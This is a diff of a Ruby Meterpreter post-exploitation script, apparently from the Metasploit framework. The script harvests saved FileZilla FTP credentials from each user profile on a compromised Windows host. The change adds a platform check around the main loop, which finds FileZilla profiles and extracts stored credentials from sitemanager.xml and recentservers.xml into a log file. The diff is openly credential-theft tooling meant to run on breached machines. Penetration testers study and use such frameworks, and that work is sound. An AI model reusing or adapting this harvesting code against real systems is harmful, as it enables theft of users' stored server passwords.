@@ -147,23 +147,28 @@ def enum_users(os)
 end
 
 ################## MAIN ##################
-print_status("Running Meterpreter FileZilla Credential harvester script")
-print_status("All services are logged at #{dest}")
-enum_users(os).each do |u|
-	print_status("Checking if Filezilla profile is present for user :::#{u['username']}:::...")
-	### Find the path (if it exists) for this user,
-	filezilla_path = check_filezilla(u['userappdata'])
-	if filezilla_path
-		print_status("FileZilla profile found!")
-		### modified to use filezilla_path
-		xml_cfg_files = ['sitemanager.xml','recentservers.xml']
-		if get_credentials
-			xml_cfg_files.each do |xml_cfg_file|
-				file_local_write(dest,extract_saved_creds(filezilla_path,xml_cfg_file))
+if client.platform =~ /win32|win64/
+	print_status("Running Meterpreter FileZilla Credential harvester script")
+	print_status("All services are logged at #{dest}")
+	enum_users(os).each do |u|
+		print_status("Checking if Filezilla profile is present for user :::#{u['username']}:::...")
+		### Find the path (if it exists) for this user,
+		filezilla_path = check_filezilla(u['userappdata'])
+		if filezilla_path
+			print_status("FileZilla profile found!")
+			### modified to use filezilla_path
+			xml_cfg_files = ['sitemanager.xml','recentservers.xml']
+			if get_credentials
+				xml_cfg_files.each do |xml_cfg_file|
+					file_local_write(dest,extract_saved_creds(filezilla_path,xml_cfg_file))
+				end
 			end
+
+		else
+			print_error("Filezilla profile not found!")
 		end
-		
-	else
-		print_error("Filezilla profile not found!")
 	end
+else
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
